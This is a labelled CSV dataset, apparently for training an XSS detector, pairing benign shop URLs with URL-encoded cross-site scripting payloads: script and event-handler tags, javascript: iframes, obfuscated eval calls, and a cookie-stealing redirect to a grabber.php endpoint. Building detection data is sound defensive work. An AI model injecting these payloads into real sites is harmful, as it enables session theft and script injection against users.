text,label
/search?q=phone,0
/search?apple=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/products?laptop=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?username1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/products?category=electronics&page=3,0
/api?action1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=electronics&page=8,0
/checkout?total=672&currency=USD,0
/products?password123=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?total=557&currency=USD,0
/api?shoes=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?q=apple&color=yellow,0
/order?username1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/wishlist?item=monitor&action=add,0
/cart?category1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/products?query=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/products?query=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=6776&view=summary,0
/search?username1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?category=stationery&page=6,0
/order?apple=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?username1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/search?q=apple&color=blue,0
/api?username1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api/items?id=199&details=true,0
/api?apple=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?item=shirt&action=add&color=red&size=large,0
/products?category=furniture&page=5&color=black,0
/order?item=bottle&quantity=98&category=clothing&color=blue,0
/api?phone=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?action1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/cart?action=add&item=phone&color=green,0
/api?username1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/wishlist?phone=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/order?item=phone&quantity=19&category=clothing&size=large,0
/order?book=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?q=apple,0
/products?category=clothing&page=2,0
/checkout?value1=%3Csvg%20onload%3Dalert%281%29%3E,1
/checkout?value1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?phone=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?laptop=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?banana=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api/items?id=569&details=true&size=medium,0
/wishlist?item=book&action=remove&color=black,0
/order?shoes=%3Csvg%20onload%3Dalert%281%29%3E,1
/order?item=tablet&quantity=94&color=black&size=medium,0
/cart?action=view&item=monitor&size=medium,0
/cart?value1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/cart?password123=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?action=update&item=bottle,0
/api/items?id=789&details=true,0
/api/items?id=135&details=true,0
/checkout?apple=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/user/profile?id=4817&view=summary&color=white,0
/products?username1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=groceries&page=4&size=medium,0
/user/profile?id=7803&view=summary,0
/order?item=phone&quantity=5&color=red,0
/cart?action=add&item=book&color=green,0
/wishlist?category1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?item=phone&action=remove&size=large,0
/wishlist?item=notebook&action=add,0
/api/items?id=104&details=true,0
/api/items?id=712&details=true,0
/cart?action=view&item=phone,0
/api?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?action=remove&item=monitor,0
/wishlist?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=notebook&quantity=57&category=groceries,0
/checkout?query=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?category=clothing&page=8,0
/cart?book=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/search?password123=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?username1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/products?category=electronics&page=9&size=large,0
/api?shoes=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/wishlist?item=book&action=add,0
/search?q=groceries,0
/wishlist?username1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/user/profile?id=2883&view=summary&color=red,0
/wishlist?search_term=%3Csvg%20onload%3Dalert%281%29%3E,1
/products?category=electronics&page=7&color=black&size=large,0
/order?search_term=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?phone=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/search?action1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/checkout?total=399&currency=USD,0
/wishlist?item=shirt&action=remove,0
/products?action1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/cart?value1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/user/profile?id=9299&view=summary,0
/user/profile?id=9674&view=summary,0
/api?apple=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?phone=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=tablet&quantity=81&category=furniture,0
/login?password123=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/order?laptop=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?action=view&item=pen,0
/order?password123=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/search?q=clothing,0
/wishlist?item=phone&action=remove,0
/cart?query=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/api/items?id=670&details=true,0
/checkout?total=391&currency=USD,0
/api?electronics=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?category=stationery&page=5&color=red&size=large,0
/user/profile?id=5310&view=summary,0
/checkout?phone=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?action=update&item=notebook,0
/order?item=bottle&quantity=91&color=green,0
/api/items?id=956&details=true,0
/order?item=bottle&quantity=78,0
/search?apple=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?username1=%3Csvg%20onload%3Dalert%281%29%3E,1
/user/profile?id=2864&view=summary,0
/api/items?id=478&details=true,0
/user/profile?id=5595&view=summary,0
/order?item=notebook&quantity=22&color=red,0
/wishlist?password123=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?item=notebook&quantity=85&category=stationery,0
/cart?book=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/products?banana=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?q=apple&size=small,0
/checkout?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/wishlist?username1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?shoes=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/products?password123=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/user/profile?id=4974&view=summary&size=medium,0
/checkout?action1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?banana=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/checkout?username1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?category1=%3Csvg%20onload%3Dalert%281%29%3E,1
/search?query=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/user/profile?id=2612&view=summary,0
/user/profile?id=9419&view=summary&color=yellow,0
/api?action1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=notebook&quantity=72&color=white,0
/products?username1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?banana=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/api/items?id=258&details=true&size=medium,0
/wishlist?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/login?banana=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/api?category1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?item=bottle&action=remove&color=white,0
/wishlist?item=monitor&action=add,0
/api?password123=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?shoes=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?q=furniture,0
/products?apple=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/api/items?id=195&details=true&color=green,0
/api/items?id=129&details=true,0
/order?banana=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/checkout?total=828&currency=USD,0
/products?category=groceries&page=2,0
/order?item=notebook&quantity=27,0
/user/profile?id=3564&view=summary,0
/products?action1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/order?item=phone&quantity=37,0
/search?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?shoes=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?action=add&item=bottle,0
/order?item=apple&quantity=43&category=stationery&size=large,0
/checkout?total=409&currency=USD&size=medium,0
/products?value1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/checkout?total=656&currency=USD&size=medium,0
/checkout?book=%3Csvg%20onload%3Dalert%281%29%3E,1
/search?laptop=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?q=furniture,0
/search?search_term=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?q=phone&color=white,0
/checkout?total=764&currency=USD&color=white,0
/products?category=stationery&page=6&color=black,0
/products?category=clothing&page=2&color=blue,0
/checkout?apple=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?search_term=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/wishlist?item=monitor&action=remove,0
/api/items?id=114&details=true,0
/checkout?total=47&currency=USD,0
/login?book=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?total=827&currency=USD&size=medium,0
/products?category=electronics&page=8&color=blue,0
/api/items?id=594&details=true,0
/order?item=bottle&quantity=88,0
/order?item=apple&quantity=34&color=red,0
/api?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/login?apple=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?category=furniture&page=10,0
/products?apple=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/user/profile?id=7816&view=summary&color=green,0
/checkout?total=650&currency=USD,0
/api/items?id=661&details=true,0
/products?category=groceries&page=2,0
/wishlist?phone=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?password123=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?value1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?book=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/api/items?id=680&details=true,0
/api/items?id=771&details=true,0
/wishlist?item=apple&action=remove&color=red&size=medium,0
/products?action1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?book=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?username1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/products?shoes=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=clothing&page=9&size=large,0
/cart?apple=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/products?category=electronics&page=8,0
/wishlist?item=chair&action=add,0
/api/items?id=966&details=true&color=yellow,0
/order?item=chair&quantity=68&category=furniture&color=red,0
/checkout?value1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/user/profile?id=5293&view=summary,0
/order?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/api/items?id=228&details=true&color=red,0
/checkout?total=814&currency=USD,0
/user/profile?id=4647&view=summary,0
/order?laptop=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?item=shirt&action=add&color=yellow,0
/cart?action=update&item=bottle&size=large,0
/checkout?total=873&currency=USD,0
/checkout?total=149&currency=USD&size=small,0
/login?phone=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/products?value1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/cart?value1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=1882&view=summary&color=red,0
/api?laptop=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?banana=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?query=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?action=update&item=phone,0
/order?item=pen&quantity=59&category=furniture&size=large,0
/search?phone=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?banana=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/wishlist?username1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?category=groceries&page=9,0
/search?apple=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=furniture&page=7,0
/search?q=stationery&size=small,0
/api?username1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/api?apple=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?shoes=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/wishlist?apple=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/checkout?total=135&currency=USD&color=blue,0
/products?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=1623&view=summary,0
/wishlist?query=%3Csvg%20onload%3Dalert%281%29%3E,1
/user/profile?id=9764&view=summary&color=red,0
/checkout?password123=%3Csvg%20onload%3Dalert%281%29%3E,1
/user/profile?id=8371&view=summary,0
/wishlist?laptop=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/cart?action=view&item=chair,0
/search?book=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/cart?action=view&item=chair,0
/cart?action1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/login?banana=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?action=add&item=book,0
/checkout?total=247&currency=USD&color=white&size=medium,0
/products?query=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/search?q=tablet&size=small,0
/search?q=electronics&color=blue,0
/api/items?id=104&details=true,0
/search?q=groceries,0
/checkout?total=977&currency=USD,0
/login?category1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/order?item=tablet&quantity=7&category=groceries&size=small,0
/order?item=pen&quantity=97&category=electronics&color=yellow,0
/order?shoes=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?value1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/products?category=furniture&page=6&color=yellow&size=large,0
/order?item=apple&quantity=37&category=groceries&color=red&size=medium,0
/wishlist?value1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?value1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/order?item=tablet&quantity=85&category=groceries&size=medium,0
/search?q=book&color=white&size=medium,0
/products?phone=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/checkout?total=322&currency=USD&size=large,0
/checkout?apple=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?apple=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/wishlist?item=chair&action=add,0
/products?book=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?action=remove&item=chair,0
/wishlist?item=monitor&action=add&size=small,0
/login?apple=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/api?shoes=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/login?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?action1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?q=tablet,0
/cart?banana=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?item=pen&quantity=94&category=clothing,0
/wishlist?query=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?shoes=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?category=stationery&page=2&size=small,0
/cart?username1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/login?action1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?total=650&currency=USD,0
/login?shoes=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/products?category=electronics&page=9,0
/cart?laptop=%3Csvg%20onload%3Dalert%281%29%3E,1
/cart?shoes=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/user/profile?id=6316&view=summary&color=black&size=medium,0
/checkout?laptop=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/login?category1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/checkout?total=519&currency=USD&color=yellow,0
/order?item=monitor&quantity=52&category=furniture,0
/order?item=bottle&quantity=88&category=furniture&color=white,0
/search?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api/items?id=601&details=true&color=yellow,0
/user/profile?id=5391&view=summary&size=medium,0
/search?laptop=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?total=634&currency=USD,0
/search?electronics=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?apple=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/checkout?book=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?q=pen&color=blue,0
/api?value1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api?category1=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?q=bottle,0
/cart?category1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?laptop=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?q=phone,0
/checkout?shoes=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/api/items?id=552&details=true&color=black,0
/api?banana=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?item=bottle&action=remove,0
/order?apple=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=756&details=true,0
